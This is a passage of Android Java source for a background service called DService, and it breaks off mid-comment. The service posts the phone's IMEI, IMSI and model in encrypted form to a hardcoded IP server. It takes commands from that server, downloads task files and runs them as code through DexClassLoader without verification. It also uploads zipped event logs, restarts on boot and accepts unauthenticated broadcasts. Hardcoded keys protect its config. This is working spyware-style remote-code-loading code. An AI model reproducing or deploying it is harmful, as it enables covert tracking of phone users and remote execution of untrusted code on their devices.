/**
 * 
 */
package com.k99k.dexplug;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;

import com.k99k.tools.android.IO;
import com.k99k.tools.android.JSON;
import com.k99k.tools.android.StringUtil;
import com.k99k.tools.encrypter.Base64Coder;
import com.k99k.tools.encrypter.Encrypter;

import dalvik.system.DexClassLoader;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

/**
 * 
 * @author tzx200
 *
 */
public class DService extends Service {

	/**
	 * 
	 */
	public DService() {
	}
	
	private static final String TAG = "DService";
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;
	
	public static final int STATE_RUNNING = 0;
	public static final int STATE_PAUSE = 1;
	public static final int STATE_STOP = 2;
	public static final int STATE_NEED_RESTART = 3;
	public static final int STATE_DIE = 4;
	
	//FIXME 将所有的log输出改为错误码定义输出
	
    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
	private static final byte[] ROOTKEY = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
	
	private static int taskSleepTime = 10*1000;
	private static int upSleepTime = 1000*10*2;
	private static int shortSleepTime = 1000*10*2;
	private static long nextUpTime;
	private static long lastUpTime = System.currentTimeMillis();
	private static long lastUpLogTime = System.currentTimeMillis();
	private static long maxLogSleepTime = 1000*60*60;
	
	private static long lastGameInitLogTime = 0;
	private static String lastGameInitGid = "";
	private static int minGameInitTime = 1000 * 20;
	private static int timeOut = 5000;
	private final static int VERSION = 1;
	private static int keyVersion = 1;
	private static final String SPLIT_STR = "@@";
	private static final String datFileType = ".dat";
	
	static final String RECEIVER_ACTION = "com.k99k.dservice";
	private static int uid = 0;
	
	private UpThread upThread;
	private TaskThread taskThread;
	
	private  String cacheDir= "/data/data/com.k99k.dexplug";
	//TODO 暂时写死
	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
	private static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
	private String emvClass = "com.k99k.dexplug.MoreView";
	private String emvPath = sdDir+"emv.jar";
	private int state = STATE_RUNNING;
	
	
	private HashMap<String,Object> config;
	private String configPath = sdDir+"cache_01";
	
	
	private void initConfig(){
		this.config = new HashMap<String, Object>();
		this.config.put("state", STATE_RUNNING);
		this.config.put("upUrl", "http://180.96.63.71:8080/plserver/PS");
		this.config.put("emvClass", "com.k99k.dexplug.MoreView");
		this.config.put("emvPath", sdDir+"emv.jar");
		this.config.put("k", Base64Coder.encode(key));
		this.config.put("kv", keyVersion);
		this.config.put("t", "");
		this.saveConfig();
	}
	
	@SuppressWarnings("unchecked")
	private HashMap<String,Object> readConfig(String configPath){
		String txt = IO.readTxt(configPath);
		Log.d(TAG, "read enc:"+txt);
		if (!StringUtil.isStringWithLen(txt, 44)) {
			Log.e(TAG, "config File error!");
			return this.config;
		}
		try {
			//key的密文为44位(明文为：6位毫秒数+16位KEY)
			String keyString = txt.substring(0,44);
			String jsonString = txt.substring(44);
			Log.d(TAG, "keyString:"+keyString);
			
			Encrypter.getInstance().setKey(ROOTKEY);
			String decKey = Encrypter.getInstance().decrypt(keyString);
			String keyStr = decKey.substring(6);
			byte[] keyDec = Base64Coder.decode(keyStr);
			Log.d(TAG, " dec:"+decKey+"DEC_KEY:"+keyStr);
			if (keyDec.length == 16) {
				key = keyDec;
				Encrypter.getInstance().setKey(key);
				String jsonStr = Encrypter.getInstance().decrypt(jsonString);
				this.config = (HashMap<String, Object>) JSON.read(jsonStr);
				if (config != null && config.size()>2) {
					this.config.put("k", Base64Coder.encode(key));
				}
			}else{
				Log.e(TAG, "config File key error!");
			}
			
		} catch (Exception e) {
			Log.e(TAG, "config File error!",e);
		}
		
		return this.config;
	}
	private String getPropString(String propName,String defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return value.toString();
	}
	private int getPropInt(String propName,int defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return Integer.parseInt(String.valueOf(value));
	}
	private void setProp(String propName,Object value,boolean isSave){
		this.config.put(propName, value);
		if (isSave) {
			this.saveConfig();
		}
	}
	
	public void saveConfig(){
		this.saveConfig(this.configPath);
	}
	
	private void saveConfig(String configPath){
		try {
			String k = Base64Coder.encode(key);
			this.config.put("timeStamp", System.currentTimeMillis());
			String conf = JSON.write(this.config);
			String cTime = String.valueOf(System.currentTimeMillis());
			String salt = cTime.substring(cTime.length()-6, cTime.length());
			Encrypter.getInstance().setKey(ROOTKEY);
			String kEnc = Encrypter.getInstance().encrypt(salt+k);
			Log.d(TAG, "salt:"+salt+" k:"+k+" kenc:"+kEnc);
			Encrypter.getInstance().setKey(key);
			String enc =  kEnc+Encrypter.getInstance().encrypt(conf);
			Log.d(TAG, "enc:"+enc);
			IO.writeTxt(configPath,enc);
			
		} catch (Exception e) {
			Log.e(TAG, "save config error!", e);
		}
	}
	
//	public  final IBinder mBinder=new LocalBinder();
//	public class LocalBinder extends Binder {
//		public DService getService() {
//			return DService.this;
//		}
//	}
	static final int ACT_EMACTIVITY_START = 11;
	static final int ACT_GAME_INIT = 12;
	static final int ACT_GAME_EXIT = 13;
	static final int ACT_GAME_CUSTOM = 14;
	static final int ACT_FEE_INIT = 15;
	static final int ACT_FEE_OK = 16;
	static final int ACT_FEE_FAIL = 17;
	static final int ACT_PUSH_RECEIVE = 18;
	static final int ACT_PUSH_CLICK = 19;
	static final int ACT_OTHER = 50;
	
	private BroadcastReceiver myReceiver = new BroadcastReceiver() {
	 
		@Override
		public void onReceive(Context context, Intent intent) {
			int act = intent.getExtras().getInt("act");
			Log.w(TAG, "receive act:"+act);
			if (act == 0) {
				Intent i = new Intent();  
				i.setClass(context, DService.class);  
				context.startService(i);
				return;
			}
			String authKey = intent.getExtras().getString("a");
			String gameId = intent.getExtras().getString("g");
			String channelId = intent.getExtras().getString("c");
			String msg = intent.getExtras().getString("m");
			if (gameId == null) {
				gameId = "";
			}
			if (channelId == null) {
				channelId = "";
			}
			if (msg == null) {
				msg = "";
			}
			//FIXME 验证发送源的合法性,imei号验证,这个用c实现
			
			
			switch (act) {
			case ACT_EMACTIVITY_START:
				Intent it= new Intent(context.getApplicationContext(), com.k99k.dexplug.EmptyActivity.class);    
				it.putExtra("emvClass", DService.this.emvClass);
				it.putExtra("emvPath", DService.this.emvPath);
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(it); 
				DLog.log(DLog.LEVEL_I, "MORE_"+act, gameId, channelId, msg);
				break;
			case ACT_GAME_INIT:
			case ACT_GAME_EXIT:
			case ACT_GAME_CUSTOM:
				DLog.log(DLog.LEVEL_I, "GAME_"+act, gameId, channelId, msg);
				break;
			case ACT_FEE_INIT:
			case ACT_FEE_OK:
			case ACT_FEE_FAIL:
				DLog.log(DLog.LEVEL_I, "FEE_"+act, gameId, channelId, msg);
				break;
			case ACT_PUSH_CLICK:
			case ACT_PUSH_RECEIVE:
				DLog.log(DLog.LEVEL_I, "PUSH_"+act, gameId, channelId, msg);
				break;

			default:
				Intent i = new Intent();  
				i.setClass(context, DService.class);  
				context.startService(i);
			}
		}
	};
	
	public void setNextUpTime(long nextUptime,String key){
		nextUpTime = nextUptime;
	}
	
	public void setUpSleepTime(int sleepTime,String key){
		upSleepTime = sleepTime;
	}
	public void setTaskSleepTime(int sleepTime,String key){
		taskSleepTime = sleepTime;
	}
	
	public void pauseService(String key){
		this.state = STATE_PAUSE;
		this.setProp("state", STATE_PAUSE,true);
	}
	
	public void stopService(String key){
		this.state = STATE_STOP;
		this.setProp("state", STATE_STOP,true);
	}
	
	public void updateTaskState(String key,int tid,int state ){
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				task.setState(state);
			}
		}
	}
	
	public PLTask getTask(int tid){
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				return task;
			}
		}
		return null;
	}
	
	private void updateKey(byte[] keyBytes,int kVersion){
		key = keyBytes;
		keyVersion = kVersion;
		this.config.put("k", Base64Coder.encode(key));
		this.config.put("kv", kVersion);
		this.saveConfig();
	}
	
	public static long doDownloadTheFile_test(String url, String filePath,
			String filename, long size) {
		// file.size()即可得到原来下载文件的大小
//		// 设置代理
//		Header header = null;
//		if (mode == 2) {
//			// 移动内网的时候使用代理
//			url = format_CMWAP_URL(strPath);
//			header = new BasicHeader("X-Online-Host",
//					format_CMWAP_ServerName(strPath));
//		}
		HttpResponse response = null;
		// 用来获取下载文件的大小
		HttpResponse response_test = null;
		long downloadfilesize = 0;
		try {
			HttpClient client = new DefaultHttpClient();
			HttpClient client_test = new DefaultHttpClient();
			HttpGet request = new HttpGet(url);
			HttpGet request_test = new HttpGet(url);
//			if (header != null) {
//				request.addHeader(header);
//			}
			response_test = client_test.execute(request_test);
			// 获取需要下载文件的大小
			long fileSize = response_test.getEntity().getContentLength();
			// 验证下载文件的完整性
			if (fileSize != 0 && fileSize == size) {
				return 0;
			}
			// 设置下载的数据位置XX字节到XX字节
			Header header_size = new BasicHeader("Range", "bytes=" + size + "-"
					+ fileSize);
			request.addHeader(header_size);
			response = client.execute(request);
			InputStream is = response.getEntity().getContent();
			if (is == null) {
				throw new RuntimeException("stream is null");
			}
//			SDCardUtil.createFolder(filePath);
			File folder = new File(filePath);
			folder.mkdirs();
			// 获取文件对象，开始往文件里面写内容
			File myTempFile = new File(filePath + "/" + filename);
			RandomAccessFile fos = new RandomAccessFile(myTempFile, "rw");
			// 从文件的size以后的位置开始写入，其实也不用，直接往后写就可以。有时候多线程下载需要用
			fos.seek(size);
			byte buf[] = new byte[IO_BUFFER_SIZE];
			
			do {
				int numread = is.read(buf);
				if (numread <= 0) {
					break;
				}
				fos.write(buf, 0, numread);
//				if (handler != null) {
////					Message msg = new Message();
					downloadfilesize += numread;
//					double percent = (double) (downloadfilesize + size)
//							/ fileSize;
////					msg.obj = String.valueOf(percent);
////					handler.sendMessage(msg);// 更新下载进度百分比
//				}
			} while (true);
			is.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			//FIXME 这里要存储进度,downloadfilesize
			
			return downloadfilesize;
		}
		return 0;
	}
	
	public static boolean zip(String src, String dest) throws IOException {
		// 提供了一个数据项压缩成一个ZIP归档输出流
		ZipOutputStream out = null;
		boolean re = false;
		try {

			File outFile = new File(dest);// 源文件或者目录
			File fileOrDirectory = new File(src);// 压缩文件路径
			out = new ZipOutputStream(new FileOutputStream(outFile));
			out.setLevel(9);
			// 如果此文件是一个文件
			if (fileOrDirectory.isFile()) {
				zipFileOrDirectory(out, fileOrDirectory, "");
			} else {
				// 返回一个文件或空阵列。
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], "");
				}
			}
			re = true;
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			// 关闭输出流
			if (out != null) {
				try {
					out.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
		return re;
	}

	private static void zipFileOrDirectory(ZipOutputStream out,
			File fileOrDirectory, String curPath) throws IOException {
		// 从文件中读取字节的输入流
		FileInputStream in = null;
		try {
			// 如果此文件是一个目录，否则返回false。
			if (!fileOrDirectory.isDirectory()) {
				// 压缩文件
				byte[] buffer = new byte[4096];
				int bytes_read;
				in = new FileInputStream(fileOrDirectory);
				// 实例代表一个条目内的ZIP归档
				ZipEntry entry = new ZipEntry(curPath
						+ fileOrDirectory.getName());
				// 条目的信息写入底层流
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1) {
					out.write(buffer, 0, bytes_read);
				}
				out.closeEntry();
			} else {
				// 压缩目录
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], curPath
							+ fileOrDirectory.getName() + "/");
				}
			}
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	public static boolean unzip(String file,String outputDirectory){
		boolean re = false;
		ZipFile zipFile = null;
		try {
			zipFile = new ZipFile(file);
			Enumeration e = zipFile.entries();
			ZipEntry zipEntry = null;
			File dest = new File(outputDirectory);
			dest.mkdirs();
			while (e.hasMoreElements()) {
				zipEntry = (ZipEntry) e.nextElement();
				String entryName = zipEntry.getName();
				InputStream in = null;
				FileOutputStream out = null;
				try {
					if (zipEntry.isDirectory()) {
						String name = zipEntry.getName();
						name = name.substring(0, name.length() - 1);
						File f = new File(outputDirectory + File.separator
								+ name);
						f.mkdirs();
					} else {
						int index = entryName.lastIndexOf("\\");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						index = entryName.lastIndexOf("/");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						File f = new File(outputDirectory + File.separator
								+ zipEntry.getName());
						in = zipFile.getInputStream(zipEntry);
						out = new FileOutputStream(f);
						int c;
						byte[] by = new byte[IO_BUFFER_SIZE];
						while ((c = in.read(by)) != -1) {
							out.write(by, 0, c);
						}
						out.flush();
					}
				} catch (IOException ex) {
					ex.printStackTrace();
				} finally {
					if (in != null) {
						try {
							in.close();
						} catch (IOException ex) {
						}
					}
					if (out != null) {
						try {
							out.close();
						} catch (IOException ex) {
						}
					}
				}
			}
			re = true;
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (zipFile != null) {
				try {
					zipFile.close();
				} catch (IOException ex) {
				}
			}
		}

		return re;
	}
	
	
	private void syncTaskList(String remoteListStr,String downUrl){
		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
			Log.d(TAG, "remote task is empty.");
			return;
		}
		String[] remoteList = remoteListStr.split("_");
		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
		synchronized (this.taskList) {
			for (int i = 0; i < remoteList.length; i++) {
				int tid = Integer.parseInt(remoteList[i]);
				boolean had = false;
				for (int j = 0; j < taskList.size(); j++) {
					PLTask t = (PLTask)this.taskList.get(j);
					if (t.getId() == tid) {
						had = true;
						break;
					}
				}
				if (!had) {
					PLTask task = this.loadTask(tid, sdDir);
					if (task == null) {
						needFetchList.add(tid);
					}
				}
			}
		}
		//fetch remote tasks
		for (Integer id : needFetchList) {
			if (this.fetchRemoteTask(id,downUrl)) {
				Log.d(TAG, "fetch OK:"+id);
				PLTask task = this.loadTask(id, this.sdDir);
				if (task != null) {
					Log.d(TAG, "loadTask OK:"+id);
					task.setDService(this);
					task.init();
					this.taskList.add(task);
				}
			}
		}
		this.saveStates();
	}
	private static final int IO_BUFFER_SIZE = 1024 * 4;
	
	
	public static boolean download(String remoteUrl,String localFile,String vKey){
		try {
			URL url = new URL(remoteUrl);
			URLConnection con = url.openConnection();
			con.setRequestProperty("v", vKey);
			InputStream is = con.getInputStream();
			byte[] bs = new byte[IO_BUFFER_SIZE];
			int len;
			OutputStream os = new FileOutputStream(localFile);
			while ((len = is.read(bs)) != -1) {
				os.write(bs, 0, len);
			}
			os.close();
			is.close();
			return true;
		} catch (Exception e) {
			Log.e(TAG, "remote conn error:"+remoteUrl);
			e.printStackTrace();
			
		}
		return false;
	}
	
	final String ENCORDING = "UTF-8";

	public boolean upload(String localFile, String upUrl, String vKey){
		String boundary = "---------------------------7dc7c595809b2";
		boolean sucess = false;
		try {
			// 分割线
			File file = new File(localFile);

			String fileName = file.getName();
			// 用来解析主机名和端口
			URL url = new URL(upUrl + "?f=" + fileName);


			// 打开连接, 设置请求头
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(10000);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type",
					"multipart/form-data; boundary=" + boundary);
			conn.setRequestProperty("Content-Length", file.length()+ "");

			conn.setDoOutput(true);
			conn.setDoInput(true);

			// 获取输入输出流
			OutputStream out = conn.getOutputStream();
			FileInputStream fis = new FileInputStream(file);

			// 写出文件数据
			byte[] buf = new byte[IO_BUFFER_SIZE];
			int len;
			while ((len = fis.read(buf)) != -1){
				out.write(buf, 0, len);
			}
			InputStream in = conn.getInputStream();
			InputStreamReader isReader = new InputStreamReader(in);
			BufferedReader bufReader = new BufferedReader(isReader);
			String line = null;
			StringBuilder data = new StringBuilder();
			while ((line = bufReader.readLine()) != null){
				data.append(line);
			}
			sucess = conn.getResponseCode() == 200;
			if (data.toString().equals("ok")) {
				
			}
			in.close();
			fis.close();
			out.close();
			conn.disconnect();
		} catch (Exception e) {
			Log.e(TAG, "upload Failed",e);
			sucess = false;
		}

		return sucess;
	}

	private boolean fetchRemoteTask(int id,String downUrl){
		
		String remote = downUrl+"?id="+id;
		String vKey = String.valueOf(DService.this.keyVersion*27+17);
		String localFile = sdDir+id+datFileType;
		
		
		return download(remote,localFile,vKey);
	}
	
	
	class UpThread extends Thread{

		private boolean runFlag = true;
		
		
		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

		private boolean up(){
			try {
				StringBuilder sb = new StringBuilder();
				int api_level = android.os.Build.VERSION.SDK_INT;
				TelephonyManager tm=(TelephonyManager) DService.this.getSystemService(DService.TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				String imsi = tm.getSubscriberId();
				String ua = android.os.Build.MODEL;
				sb.append(api_level).append(SPLIT_STR);
				sb.append(imei).append(SPLIT_STR);
				sb.append(imsi).append(SPLIT_STR);
				sb.append(ua).append(SPLIT_STR);
				sb.append(DService.VERSION).append(SPLIT_STR);
				sb.append(lastUpTime).append(SPLIT_STR);
				sb.append(System.currentTimeMillis()).append(SPLIT_STR);
				//DService.this.taskList;
				synchronized (DService.this.taskList) {
					for (int i = 0; i < DService.this.taskList.size(); i++) {
						PLTask t = (PLTask)DService.this.taskList.get(i);
						sb.append("_");
						sb.append(t.getId());
					}
				}
				
				Log.d(TAG, "postUrl data:"+sb.toString());
				
				String data = "up="+Encrypter.getInstance().encrypt(sb.toString());
				URL aUrl = new URL(upUrl);
			    URLConnection conn = aUrl.openConnection();
			    conn.setConnectTimeout(timeOut);
			    //header 中传keyVersion,加入简单的算法干扰
			    conn.setRequestProperty("v", String.valueOf(DService.this.keyVersion*27+17));
			    conn.setDoInput(true);
			    conn.setDoOutput(true);
			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			    wr.write(data);
			    wr.flush();

			    // Get the response
			    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			    String line;
			    sb = new StringBuilder();
				while ((line = rd.readLine()) != null) {
					sb.append(line);
				}
			    wr.close();
			    rd.close();
			    //判断是否错误
			    String resp = sb.toString();
			    
			    Log.d(TAG, "resp:"+resp);
			    
			    if (!StringUtil.isStringWithLen(resp, 4)) {
					//判断错误码
			    	if (resp.equals(ERR_KEY_EXPIRED)) {
						//key过期,发起更新key的请求升级key
			    		
					}else{
						//
						Toast.makeText(DService.this, resp, Toast.LENGTH_SHORT).show();;
					}
			    	return false;
				}
			    //解密
				String re = Encrypter.getInstance().decrypt(resp);
				Log.d(TAG, "dec re:"+re);
				String[] res = re.split(SPLIT_STR);
				if (!StringUtil.isDigits(res[0])) {
					Log.e(TAG, "re length Error:"+re);
					return false;
				}
				int order = Integer.parseInt(res[0]);
				switch (order) {
				case ORDER_NONE:
					return true;
				case ORDER_SYNC_TASK:
					//比对task_id_list,进行同步
					Log.d(TAG, "url:"+res[1]);
					String downLoadUrl = res[1];
					String remoteTaskIds = res[2];
					DService.this.syncTaskList(remoteTaskIds,downLoadUrl);
					return true;
				case ORDER_DEL_TASK:
					
					
					break;
				case ORDER_KEY:
					//resp: ORDER_KEY|base64(key)|keyVersion
					
					DService.this.setProp("key",res[1],true);
					Encrypter.getInstance().setKey(Base64Coder.decode(res[1]));
					keyVersion = Integer.parseInt(res[2]);
					break;
				case ORDER_UPDATE:
					
					
					break;
				case ORDER_UPTIME:
					
					
					break;
				case ORDER_RESTART_SERVICE:
					
					
					break;
				case ORDER_STOP_SERVICE:
					
					
					break;
				default:
					//比对task_id_list
					
					
					break;
				}
				//keyVersion更新
				
				
			} catch (IOException e) {
				Log.e(TAG, "up Error:"+upUrl, e);
			} catch (Exception e) {
				Log.e(TAG, "up unknown Error:"+upUrl, e);
				DService.this.state = STATE_NEED_RESTART;
			}
			return false;
		}


		@Override
		public void run() {
			if (DService.this.state != STATE_RUNNING) {
				return;
			}
			nextUpTime = 1;
			
			try {
				while (runFlag && DService.this.state == STATE_RUNNING) {
					Log.d(TAG, "up running state:"+DService.this.state);
					if (System.currentTimeMillis()>nextUpTime) {
						//每天仅发起一次请求，如果请求失败，等待10分钟
						if (this.up()) {
//							Calendar ca = Calendar.getInstance();
//							ca.add(Calendar.DATE, 1);
//							ca.set(Calendar.HOUR_OF_DAY, 6);
//							nextUpTime = ca.getTimeInMillis();
							lastUpTime = System.currentTimeMillis();
							nextUpTime += upSleepTime;
							Log.d(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+DService.this.state);
						}else{
							Thread.sleep(shortSleepTime);
							continue;
						}
					}
					//日志上传
					String logs = DLog.read();
					//判断是否有足够内容,或超过最大上传时间间隔
					Log.d(TAG, "log size:"+logs.length());
					if (StringUtil.isStringWithLen(logs, 1024*2) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
						boolean re = false;
						String lFile = DService.sdDir+uid+"_"+System.currentTimeMillis()+".zip";
						try {
							re = zip(DLog.logFile, lFile);
						} catch (IOException e) {
							Log.e(TAG, "zip error",e);
						}
						if(re){
							re = upload(lFile,upLogUrl , "");
						}
						File f = new File(lFile);
						f.delete();
						if (re) {
							lastUpLogTime = System.currentTimeMillis();
							f = new File(DLog.logFile);
							f.delete();
						}else{
							Thread.sleep(shortSleepTime);
							continue;
						}
					}
					
					
					Thread.sleep(upSleepTime);
				}
			} catch (InterruptedException e) {
			}
		}
		
	}

	private ArrayList<PLTask> taskList = new ArrayList<PLTask>();
	private Handler handler; 
	
	public void addTask(PLTask task){
		synchronized (this.taskList) {
			this.taskList.add(task);
		}
		this.saveStates();
	}
	
	public void delTask(int taskId){
		synchronized (this.taskList) {
			for (PLTask task : this.taskList) {
				if (task.getId() == taskId) {
					this.taskList.remove(task);
					this.removeDat(task.getId());
				}
			}
		}
		this.saveStates();
	}
	
	public void delTask(PLTask task){
		synchronized (this.taskList) {
			
			this.taskList.remove(task);
			this.removeDat(task.getId());
		}
		this.saveStates();
	}
	
	private void removeDat(int tid){
		try {
			File f = new File(sdDir+tid+datFileType);
			if (f.exists()) {
				f.delete();
				Log.d(TAG, "DAT remove OK:"+tid);
			}
			f = new File(sdDir+tid+".jar");
			if (f.exists()) {
				f.delete();
				Log.d(TAG, "jar remove OK:"+tid);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	class TaskThread extends Thread{
	
		private boolean runFlag = true;
		
		
		@Override
		public void run() {
			if (DService.this.state != STATE_RUNNING) {
				return;
			}
			//先初始化所有的task
			synchronized (DService.this.taskList) {
				for (int i = 0; i < taskList.size(); i++) {
					PLTask t = (PLTask)taskList.get(i);
					t.init();
				}
			}
			
			try {
				while (runFlag && DService.this.state == STATE_RUNNING) {
					Log.d(TAG, "task check");
					for (PLTask task : taskList) {
						int state = task.getState();
						Log.d(TAG, "task state:"+state);
						switch (state) {
						case PLTask.STATE_WAITING:
							try {
								new Thread(task).start();
							} catch (Exception e) {
								e.printStackTrace();
								Log.e(TAG, "task exec error:"+task.getId());
							}
							break;
						case PLTask.STATE_DIE:
							DService.this.delTask(task);
							break;
						default:
							break;
						}
					}
					Log.d(TAG, runFlag+","+DService.this.state+","+taskSleepTime);
					Thread.sleep(taskSleepTime);
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		

		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

	}
	
	
	
	private void saveStates(){
		StringBuilder sb = new StringBuilder();
		synchronized (this.taskList) {
			for (PLTask task : taskList) {
				sb.append(SPLIT_STR);
				int id = task.getId();
				sb.append(id);
			}
		}
		sb.delete(0, 2);
		Log.d(TAG, "save task list:"+sb.toString());
		this.setProp("t", sb.toString(),false);
		this.setProp("emvClass", emvClass,false);
		this.setProp("emvPath", emvPath,false);
		this.saveConfig();
	}
	
	/**
	 * 供Task访问，可实现Task之间的交互
	 * @return
	 */
	ArrayList<PLTask> getTaskList(){
		return this.taskList;
	}
	
	private PLTask loadTask(int id,String localPath){
		String dexPath = localPath+id+datFileType;
		File f = new File(dexPath);
		if (f.exists() && f.isFile()) {
			try{
				//TODO 这里需要解密处理,暂不实现加解密,直接下载的就是原始dex文件
				dexPath = localPath+id+".jar";
				f.renameTo(new File(dexPath));
				
				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, cacheDir,null, this.getClass().getClassLoader()); 
				Class<?> class1 = cDexClassLoader.loadClass("com.k99k.dexplug.PLTask"+id);	
				PLTask plug =(PLTask)class1.newInstance();
				
				//TODO 这里需要重新加密,移除解密后的文件
				dexPath = localPath+id+datFileType;
				f.renameTo(new File(dexPath));
				return plug;
			}catch (Exception e) {
				Log.e(TAG, "loadTask error:"+localPath);
				e.printStackTrace();
			}    
		}
		return null;
	}
	
	private void stop(){
		if (this.upThread.runFlag) {
			this.upThread.setRun(false);
		}
		if (this.taskThread.runFlag) {
			this.taskThread.setRun(false);
		}
		if (this.state == STATE_DIE) {
			this.unregisterReceiver(this.myReceiver);
		}else{
			this.state = STATE_STOP;
		}
		Log.d(TAG, "stoped...");
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
		}
	}
	
	private void init(){
		Log.d(TAG, "init...");
		this.config = this.readConfig(this.configPath);
		if (this.config == null || this.config.size() <= 0) {
			//直接初始化config
			initConfig();
			Log.d(TAG, "no conf");
		}else{
			Log.d(TAG, "init config OK.");
		}
		if (this.state == STATE_NEED_RESTART) {
			//重启
			this.stop();
			this.state = STATE_RUNNING;
		}else{
			this.state = this.getPropInt("state", STATE_RUNNING);
		}
		if (this.state == STATE_STOP) {
			this.stop();
			return;
		}else if(this.state == STATE_DIE){
			//这里的STATE_DIE状态直接杀死本进程
			this.stop();
			this.stopSelf();
			return;
		}else if(this.state == STATE_PAUSE){
			return;
		}
		cacheDir = getApplicationInfo().dataDir;
		emvClass = this.getPropString("emvClass", "com.k99k.dexplug.MoreView");
		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
		(new File(sdDir)).mkdirs();
		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
		keyVersion = this.getPropInt("kv", keyVersion);
		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
		String tasks = this.getPropString( "t", "");
		Log.d(TAG, "init tasks:"+tasks);
		if (StringUtil.isStringWithLen(tasks, 1)) {
			String[] taskArr = tasks.split(SPLIT_STR);
			this.taskList.clear();
			for (int i = 0; i < taskArr.length; i++) {
				int tid = Integer.parseInt(taskArr[i]);
				PLTask task = this.loadTask(tid, sdDir);
				if (task != null) {
					task.setDService(this);
					this.taskList.add(task);
				}else{
					Log.e(TAG, "load task failed:"+tid);
				}
			}
		}
		
		if (this.upThread != null || this.taskThread!=null) {
			this.upThread.setRun(false);
			this.taskThread.setRun(false);
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
			}
		}
		this.upThread = new UpThread();
		this.upThread.start();
		this.taskThread = new TaskThread();
		this.taskThread.start();
		
		IntentFilter myFilter = new IntentFilter();  
        myFilter.addAction("android.intent.action.BOOT_COMPLETED");  
        myFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");  
        myFilter.addAction(RECEIVER_ACTION);  
        this.registerReceiver(myReceiver, myFilter);  
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		Log.d(TAG, "dservice created...");
		handler = new Handler(Looper.getMainLooper());
		this.init();
		
		
	}
	
	public Handler getHander(){
		return this.handler;
	}

	/* (non-Javadoc)
